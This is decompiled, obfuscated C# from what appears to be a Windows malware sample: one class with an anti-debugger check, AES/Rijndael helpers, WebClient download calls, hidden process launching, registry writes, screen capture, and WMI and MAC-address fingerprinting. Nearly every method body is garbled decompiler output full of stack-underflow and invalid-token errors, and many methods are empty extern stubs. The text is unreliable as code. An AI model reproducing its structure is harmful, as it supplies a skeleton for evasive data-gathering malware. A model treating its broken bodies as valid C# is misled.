using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Management;
using System.Net;
using System.Net.NetworkInformation;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Windows.Forms;
using Microsoft.Win32;

namespace ns0;

internal class Class5
{
	public static bool bool_0;

	public static bool bool_1;

	public static bool bool_2;

	public static bool bool_3;

	public static bool bool_4;

	public static string string_0;

	public static string string_1;

	private static readonly List<string> list_0;

	public static string string_2;

	public static string string_3;

	[DllImport("kernel32.dll")]
	public static extern IntPtr GetModuleHandle(string string_4);

	[DllImport("kernel32.dll", ExactSpelling = true, SetLastError = true)]
	private static extern bool CheckRemoteDebuggerPresent(IntPtr intptr_0, ref bool bool_5);

	public static string smethod_0(string string_4)
	{
		//Discarded unreachable code: IL_0006, IL_000e, IL_0012, IL_001a
		//IL_0008: Unknown result type (might be due to invalid IL or missing references)
		//IL_000e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0014: Expected F8, but got I4
		//IL_0014: Unknown result type (might be due to invalid IL or missing references)
		while (true)
		{
		}
	}

	private unsafe static string smethod_1()
	{
		//Discarded unreachable code: IL_0039
		//IL_0005: Expected native int or pointer, but got F4
		//IL_000c: Invalid comparison between Unknown and F4
		//IL_000f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0012: Unknown result type (might be due to invalid IL or missing references)
		//IL_0018: Unknown result type (might be due to invalid IL or missing references)
		//IL_001d: Invalid comparison between Unknown and F8
		//IL_003c: Unknown result type (might be due to invalid IL or missing references)
		while (true)
		{
			if ((int)(*(float*)null) == 0)
			{
				continue;
			}
			float num = ((float[])/*Error near IL_000c: Stack underflow*/)[/*Error near IL_000c: Stack underflow*/];
			if (!((float)/*Error near IL_000e: Stack underflow*/ >= num))
			{
				checked
				{
					int num2 = (short)(/*Error near IL_0010: Stack underflow*/ + /*Error near IL_0010: Stack underflow*/);
					_003F val = /*Error near IL_0013: Stack underflow*/* num2;
					if (/*Error near IL_0018: Stack underflow*/ > val)
					{
						_ = (uint)(/*Error near IL_0019: Stack underflow*/ * /*Error near IL_0019: Stack underflow*/);
						/*Error near IL_001a: starg 0 (out-of-bounds)*/;
						double num3 = (double)/*Error near IL_001d: Stack underflow*/;
						if (!((double)/*Error near IL_0022: Stack underflow*/ <= num3))
						{
							*unchecked((_003F*)(nint)/*Error near IL_0024: Stack underflow*/) = /*Error near IL_0024: Stack underflow*/;
							/*Error near IL_0024: Invalid metadata token*/;
						}
					}
				}
			}
			else if (/*Error near IL_002e: Stack underflow*/ <= /*Error near IL_002e: Stack underflow*/&& (int)/*Error near IL_0033: Stack underflow*/ != 0)
			{
				break;
			}
		}
		/*Error near IL_0033: ldarg 3 (out-of-bounds)*/;
		/*Error near IL_0034: Invalid metadata token*/;
	}

	private static extern void smethod_2();

	private static extern void smethod_3(string string_4, string string_5);

	private static extern void Main();

	private static extern void smethod_4();

	private static extern bool smethod_5();

	private static bool smethod_6()
	{
		//Discarded unreachable code: IL_000a
		double num = (double)/*Error near IL_0001: Stack underflow*/;
		((float[])/*Error near IL_0002: Stack underflow*/)[/*Error near IL_0002: Stack underflow*/] = (float)num;
		short num2 = ((short[])/*Error near IL_0003: Stack underflow*/)[/*Error near IL_0003: Stack underflow*/];
		_ = num2 | num2;
		/*Error near IL_0005: Invalid metadata token*/;
	}

	private static extern bool smethod_7();

	private static extern string smethod_8();

	public extern Class5();

	static byte[] smethod_9(string string_4)
	{
		//Discarded unreachable code: IL_0006, IL_000b, IL_0017
		//IL_0010: Unknown result type (might be due to invalid IL or missing references)
		_ = ((uint[])/*Error near IL_0001: Stack underflow*/)[/*Error near IL_0001: Stack underflow*/];
		/*Error near IL_0001: Invalid metadata token*/;
	}

	unsafe static RijndaelManaged smethod_10()
	{
		//Discarded unreachable code: IL_0003, IL_0008, IL_000e
		//IL_0009: Invalid comparison between Unknown and I4
		_ = *(double*)(int)(*(uint*)(nint)/*Error near IL_0001: Stack underflow*/);
		/*Error near IL_0002: Unknown opcode: 0xFD*/;
	}

	static extern void smethod_11(SymmetricAlgorithm symmetricAlgorithm_0, int int_0);

	static extern void smethod_12(SymmetricAlgorithm symmetricAlgorithm_0, int int_0);

	static extern Encoding smethod_13();

	static extern byte[] smethod_14(Encoding encoding_0, string string_4);

	unsafe static void smethod_15(SymmetricAlgorithm symmetricAlgorithm_0, byte[] byte_0)
	{
		//Discarded unreachable code: IL_000b, IL_000c
		//IL_0005: Invalid comparison between Unknown and I4
		//IL_0018: Expected I4, but got I8
		//IL_0018: Unknown result type (might be due to invalid IL or missing references)
		object obj;
		do
		{
			((short[])/*Error near IL_0001: Stack underflow*/)[/*Error near IL_0001: Stack underflow*/] = (short)/*Error near IL_0001: Stack underflow*/;
			obj = *(object*)(nint)/*Error near IL_0003: Stack underflow*/;
		}
		while ((int)/*Error near IL_000a: Stack underflow*/ != (ushort)obj);
		/*Error near IL_000a: Unknown opcode: 0xFF*/;
	}

	static extern void smethod_16(SymmetricAlgorithm symmetricAlgorithm_0, byte[] byte_0);

	static extern void smethod_17(SymmetricAlgorithm symmetricAlgorithm_0, PaddingMode paddingMode_0);

	static extern void smethod_18(SymmetricAlgorithm symmetricAlgorithm_0, CipherMode cipherMode_0);

	static extern byte[] smethod_19(SymmetricAlgorithm symmetricAlgorithm_0);

	static extern byte[] smethod_20(SymmetricAlgorithm symmetricAlgorithm_0);

	static extern ICryptoTransform smethod_21(SymmetricAlgorithm symmetricAlgorithm_0, byte[] byte_0, byte[] byte_1);

	static byte[] smethod_22(ICryptoTransform icryptoTransform_0, byte[] byte_0, int int_0, int int_1)
	{
		//Discarded unreachable code: IL_000a
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		while (/*Error near IL_0005: Stack underflow*/ <= /*Error near IL_0005: Stack underflow*/)
		{
		}
		/*Error near IL_0005: Invalid metadata token*/;
	}

	static extern Encoding smethod_23();

	static string smethod_24(Encoding encoding_0, byte[] byte_0)
	{
		//Discarded unreachable code: IL_0005, IL_0012, IL_0016
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		/*Error: Invalid metadata token*/;
	}

	static extern void smethod_25(IDisposable idisposable_0);

	static extern string smethod_26(string string_4);

	static extern WebClient smethod_27();

	static extern string smethod_28(string string_4, string string_5);

	static void smethod_29(WebClient webClient_0, string string_4, string string_5)
	{
		//Discarded unreachable code: IL_0005, IL_000b
		/*Error: Invalid metadata token*/;
	}

	static extern void smethod_30(Component component_0);

	static Process smethod_31()
	{
		//Discarded unreachable code: IL_000f, IL_0014, IL_001b, IL_0024
		//IL_0002: Expected O, but got I4
		//IL_0005: Invalid comparison between I4 and Unknown
		//IL_0005: Incompatible stack heights: 0 vs 1
		//IL_0016: Invalid comparison between Unknown and I4
		//IL_001f: Expected O, but got I4
		//IL_001f: Invalid comparison between Unknown and I
		do
		{
			checked
			{
				sbyte num = (sbyte)/*Error near IL_0001: Stack underflow*/;
				((object[])/*Error near IL_0002: Stack underflow*/)[/*Error near IL_0002: Stack underflow*/] = num;
				_ = (ushort)/*Error near IL_0003: Stack underflow*/;
			}
		}
		while (1 > (int)/*Error near IL_0004: ldarg 3 (out-of-bounds)*/);
		/*Error near IL_000a: Invalid metadata token*/;
	}

	static ProcessStartInfo smethod_32()
	{
		//IL_0005: Expected O, but got I4
		//IL_0005: Invalid comparison between Unknown and I
		//IL_000d: Invalid comparison between Unknown and I4
		while (true)
		{
			uint num = checked((uint)(object)null);
			IntPtr intPtr = (nint)((Array)((short[])/*Error near IL_0004: Stack underflow*/)[num]).LongLength;
			if ((nint)/*Error near IL_000a: Stack underflow*/ > (nint)intPtr)
			{
				byte num2 = ((byte[])/*Error near IL_000c: Stack underflow*/)[/*Error near IL_000c: Stack underflow*/];
				if ((int)/*Error near IL_0012: Stack underflow*/ > (int)(sbyte)num2)
				{
					/*Error: Could not find block for branch target IL_0012*/;
				}
			}
		}
	}

	static extern void smethod_33(ProcessStartInfo processStartInfo_0, ProcessWindowStyle processWindowStyle_0);

	static extern void smethod_34(ProcessStartInfo processStartInfo_0, string string_4);

	static extern string smethod_35(string string_4, string string_5, string string_6);

	unsafe static void smethod_36(ProcessStartInfo processStartInfo_0, string string_4)
	{
		//IL_0001: Invalid comparison between Unknown and O
		//IL_000b: Invalid comparison between Unknown and I4
		while (true)
		{
			if (/*Error near IL_0006: Stack underflow*/ >= null)
			{
				int num = *(int*)(nint)/*Error near IL_000a: Stack underflow*/;
				if ((int)/*Error near IL_0010: Stack underflow*/ >= num)
				{
					break;
				}
			}
		}
		checked
		{
			_ = (nuint)/*Error near IL_0011: Stack underflow*/;
			/*Error near IL_0011: Invalid metadata token*/;
		}
	}

	static void smethod_37(Process process_0, ProcessStartInfo processStartInfo_0)
	{
		//Discarded unreachable code: IL_0005, IL_000b, IL_0012
		//IL_0006: Invalid comparison between Unknown and I4
		/*Error: Invalid metadata token*/;
	}

	static bool smethod_38(Process process_0)
	{
		//Discarded unreachable code: IL_0006, IL_000c, IL_0011, IL_0016
		_ = 1;
		/*Error near IL_0001: Invalid metadata token*/;
	}

	static extern void smethod_39(int int_0);

	static extern void smethod_40(string string_4);

	static extern string smethod_41(string string_4);

	static Assembly smethod_42()
	{
		//Discarded unreachable code: IL_0006, IL_000b, IL_0010
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0001: Incompatible stack heights: 0 vs 1
		while (true)
		{
			_ = /*Error near IL_0001: Stack underflow*// /*Error near IL_0001: Stack underflow*/;
		}
	}

	static extern Stream smethod_43(Assembly assembly_0, string string_4);

	static FileStream smethod_44(string string_4, FileMode fileMode_0, FileAccess fileAccess_0)
	{
		//Discarded unreachable code: IL_000c
		//IL_0008: Expected O, but got I4
		//IL_0011: Expected O, but got I
		while ((int)/*Error near IL_0005: Stack underflow*/ != 0)
		{
		}
		checked
		{
			_ = (sbyte)/*Error near IL_0007: Stack underflow*/;
			/*Error near IL_0007: Invalid metadata token*/;
		}
	}

	static extern void smethod_45(Stream stream_0, Stream stream_1);

	static Process smethod_46(string string_4)
	{
		//Discarded unreachable code: IL_0005, IL_000d, IL_001a
		//IL_0005: Unknown result type (might be due to invalid IL or missing references)
		//IL_0007: Expected I4, but got Unknown
		/*Error: Invalid metadata token*/;
	}

	static extern string smethod_47(Assembly assembly_0);

	static void smethod_48(string string_4, string string_5, bool bool_5)
	{
		_ = 8;
	}

	static extern RegistryKey smethod_49(RegistryKey registryKey_0, string string_4, bool bool_5);

	static extern void smethod_50(RegistryKey registryKey_0, string string_4, object object_0);

	static extern DialogResult smethod_51(string string_4, string string_5, MessageBoxButtons messageBoxButtons_0, MessageBoxIcon messageBoxIcon_0);

	static Assembly smethod_52()
	{
		//Discarded unreachable code: IL_0022
		//IL_0012: Invalid comparison between Unknown and I
		//IL_0018: Unknown result type (might be due to invalid IL or missing references)
		//IL_0020: Unknown result type (might be due to invalid IL or missing references)
		while (true)
		{
			if ((short)/*Error near IL_0004: Stack underflow*/ != 0 && /*Error near IL_000e: Stack underflow*/>= /*Error near IL_000e: Stack underflow*/)
			{
				nuint num = checked((nuint)/*Error near IL_0010: Stack underflow*/);
				if ((nint)/*Error near IL_0017: Stack underflow*/ > (nint)num)
				{
					break;
				}
			}
		}
		_ = checked(/*Error near IL_0019: Stack underflow*/ + 8) + ((double[])5)[(short)null];
		/*Error near IL_0021: Unknown opcode: 0xFC*/;
	}

	static string smethod_53(string string_4)
	{
		//Discarded unreachable code: IL_0009
		//IL_0007: Unknown result type (might be due to invalid IL or missing references)
		double num = ((double[])5)[(short)null];
		_ = /*Error near IL_0008: Stack underflow*/+ num;
		/*Error near IL_0008: Unknown opcode: 0xFC*/;
	}

	static bool smethod_54(string string_4, string string_5)
	{
		//Discarded unreachable code: IL_0016, IL_001e, IL_0025, IL_002b, IL_0031
		//IL_000c: Invalid comparison between Unknown and F8
		//IL_002b: Unsupported input type for neg.
		//IL_002b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0031: Unknown result type (might be due to invalid IL or missing references)
		while (true)
		{
			((long[])/*Error near IL_0001: Stack underflow*/)[/*Error near IL_0001: Stack underflow*/] = (long)/*Error near IL_0001: Stack underflow*/;
			if (/*Error near IL_0006: Stack underflow*/ <= /*Error near IL_0006: Stack underflow*/)
			{
				double num = ((double[])/*Error near IL_000c: Stack underflow*/)[394120324];
				if (!((double)/*Error near IL_0011: Stack underflow*/ >= num))
				{
					break;
				}
			}
		}
		/*Error near IL_0011: Invalid metadata token*/;
	}

	static extern Rectangle smethod_55(Point point_0);

	static extern Bitmap smethod_56(int int_0, int int_1);

	static Graphics smethod_57(Image image_0)
	{
		throw /*Error near IL_0001: Stack underflow*/;
	}

	static extern void smethod_58(Graphics graphics_0, Point point_0, Point point_1, Size size_0);

	static ImageFormat smethod_59()
	{
		_ = ((object[])/*Error near IL_0002: Stack underflow*/)[/*Error near IL_0002: Stack underflow*/];
		/*Error near IL_0003: ldloc 0 (out-of-bounds)*/;
		/*Error near IL_0004: ldloc 0 (out-of-bounds)*/;
		/*Error near IL_0006: Invalid metadata token*/;
	}

	static extern void smethod_60(Image image_0, string string_4, ImageFormat imageFormat_0);

	static bool smethod_61(string string_4)
	{
		//Discarded unreachable code: IL_0005
		//IL_0010: Expected I4, but got I8
		/*Error: Invalid metadata token*/;
	}

	static extern void smethod_62(Process process_0);

	static string[] smethod_63(string string_4, char[] char_0)
	{
		//Discarded unreachable code: IL_0006, IL_000b, IL_0011
		checked
		{
			_ = (nint)/*Error near IL_0001: Stack underflow*/;
			/*Error near IL_0001: Invalid metadata token*/;
		}
	}

	static extern string smethod_64(WebClient webClient_0, string string_4);

	static extern string smethod_65();

	static extern string smethod_66();

	static extern string smethod_67(string[] string_4);

	static extern void smethod_68(string string_4, string string_5);

	static extern Process[] smethod_69();

	static string smethod_70(Process process_0)
	{
		//IL_0006: Expected I4, but got I8
		switch (((long[])/*Error near IL_0001: Stack underflow*/)[/*Error near IL_0001: Stack underflow*/])
		{
		default:
			;
			break;
		}
		/*Error: Unexpected end of block*/;
	}

	static extern void smethod_71(Process process_0);

	static extern Process smethod_72();

	static extern IntPtr smethod_73(Process process_0);

	static extern ManagementObjectSearcher smethod_74(string string_4);

	static ManagementObjectCollection smethod_75(ManagementObjectSearcher managementObjectSearcher_0)
	{
		//Discarded unreachable code: IL_0005, IL_0009
		/*Error: Invalid metadata token*/;
	}

	static extern ManagementObjectEnumerator smethod_76(ManagementObjectCollection managementObjectCollection_0);

	static extern ManagementBaseObject smethod_77(ManagementObjectEnumerator managementObjectEnumerator_0);

	static extern object smethod_78(ManagementBaseObject managementBaseObject_0, string string_4);

	static extern string smethod_79(object object_0);

	static extern string smethod_80(string string_4);

	static extern bool smethod_81(string string_4, string string_5);

	static extern string smethod_82(string string_4);

	static extern bool smethod_83(string string_4, string string_5);

	static extern bool smethod_84(ManagementObjectEnumerator managementObjectEnumerator_0);

	static extern NetworkInterface[] smethod_85();

	static extern OperationalStatus smethod_86(NetworkInterface networkInterface_0);

	static extern PhysicalAddress smethod_87(NetworkInterface networkInterface_0);

	static string smethod_88(string string_4, char[] char_0)
	{
		//Discarded unreachable code: IL_000e
		//IL_0001: Invalid comparison between Unknown and O
		object obj;
		do
		{
			obj = ((object[])/*Error near IL_0001: Stack underflow*/)[/*Error near IL_0001: Stack underflow*/];
		}
		while (/*Error near IL_0006: Stack underflow*/ >= obj);
		checked
		{
			_ = (nint)unchecked((long)checked((ulong)/*Error near IL_0007: Stack underflow*/));
			/*Error near IL_0008: stloc 0 (out-of-bounds)*/;
			/*Error near IL_0009: Invalid metadata token*/;
		}
	}
}
